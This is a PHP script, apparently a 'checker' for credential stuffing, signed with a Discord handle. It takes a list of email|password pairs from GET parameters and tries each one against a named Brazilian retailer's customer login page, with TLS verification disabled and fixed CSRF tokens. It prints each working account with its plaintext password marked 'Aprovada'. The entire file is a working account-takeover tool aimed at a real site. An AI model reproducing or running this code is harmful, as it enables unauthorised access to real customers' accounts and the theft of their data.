<?php
//CHECKER AAZ FARMA BT tmDISCORD @DEMONDESTROIER
extract($_GET);
error_reporting(0);
if (file_exists(getcwd().('/cookie.txt'))) { 
    @unlink('cookie.txt'); 
}

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end, $str[1]);
	return $str[0];
}	

{
	$separador = "|";
	$e = explode("\r\n", $lista);
	$c = count($e);
	for ($i=0; $i <$c; $i++) {
		$explode = explode($separador, $e[$i]);
		Testar(trim($explode[0]),trim($explode[1]));
	}
}
function Testar($email,$senha){
	if (file_exists(getcwd()."/cookies.txt")) {
		unlink(getcwd()."/cookies.txt");
	}

	//VARIAVEIS DE CONFIG
////////////////////////////////////////////
	$url = "https://cliente.kalunga.com.br/minha-conta/login";

	$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";

	$postField = 'csrf_token=ImE0M2YxOGU5YWViMjhlMTJlOGY2MTQ3NWIyMGU2ZDY3YWU3MzgwMTMi.ZBr8HA.rbWplewf-3PP8xNrbBLosClfm5U&login='.$email.'&g-recaptcha-response=';

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_ENCODING, "gzip"); //QUEBRAR CRIPTOGRAFIA
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
	curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			
		'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control: max-age=0',
		'content-type: application/x-www-form-urlencoded',
		'origin: https://cliente.kalunga.com.br',
		'referer: https://cliente.kalunga.com.br/minha-conta/login',
		'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
		'sec-ch-ua-mobile: ?0',
		'sec-ch-ua-platform: "Windows"',
		'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',		


				));
	;
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postField);
	$a = curl_exec($ch);

////////////////////////////////////////////

	$url = "https://cliente.kalunga.com.br/minha-conta/login";

	$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";

	$postField = 'csrf_token=ImE0M2YxOGU5YWViMjhlMTJlOGY2MTQ3NWIyMGU2ZDY3YWU3MzgwMTMi.ZBr8Pg.9f3Y-Uwilz4CNhURFcK1n6ijlmQ&user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F109.0.0.0+Safari%2F537.36&ip=6a1747f1cbf27f43c29d4b3a1acbab1c&esqueci_senha=False&login='.$email.'&password='.$senha.'&g-recaptcha-response=';

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_ENCODING, "gzip"); //QUEBRAR CRIPTOGRAFIA
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
	curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			
			
		'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control: max-age=0',
		'content-type: application/x-www-form-urlencoded',
		'origin: https://cliente.kalunga.com.br',
		'referer: https://cliente.kalunga.com.br/minha-conta/login',
		'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
		'sec-ch-ua-mobile: ?0',
		'sec-ch-ua-platform: "Windows"',
		'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',

				));
	;
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postField);
	 $ab = curl_exec($ch);

$msgerro = getStr($ab, 'componentcard__text text-danger">','</p>');

////////////////////////////////////////////////////////////////////


	//$disco = GetStr($resposta, "'Total Disk Space Used',':'");

		if (strpos($ab, 'Para maior segurança,')) {

		echo "<font color='#01DF01'> Aprovada »</font> <font color='#000000'>Conta Calunga: ".$email."  ".$senha." </font>¹7 ¹<font color='red'>#</font><font color='#ffaa00'>D</font><font color='#aaff00'>E</font><font color='lime'>M</font><font color='#00ffaa'>0</font><font color='#00a9ff'>N</font><font color='blue'>6</font><font color='#aa00ff'>6</font><font color='#ff00aa'>6</font>¹7 ¹<br />";
		flush();
		ob_flush();
	}else{
		echo "<font color='#FF0000'> REPROVADA » </font> Conta Calunga:  ".$email." | ".$senha." ".$nome." <font color='red'>#</font><font color='#ffaa00'>D</font><font color='#aaff00'>E</font><font color='lime'>M</font><font color='#00ffaa'>O</font><font color='#00a9ff'>N</font><font color='blue'>6</font><font color='#aa00ff'>6</font><font color='#ff00aa'>6</font><br /></font> ";
		flush();
		ob_flush();
	}
}
//DEMON
?>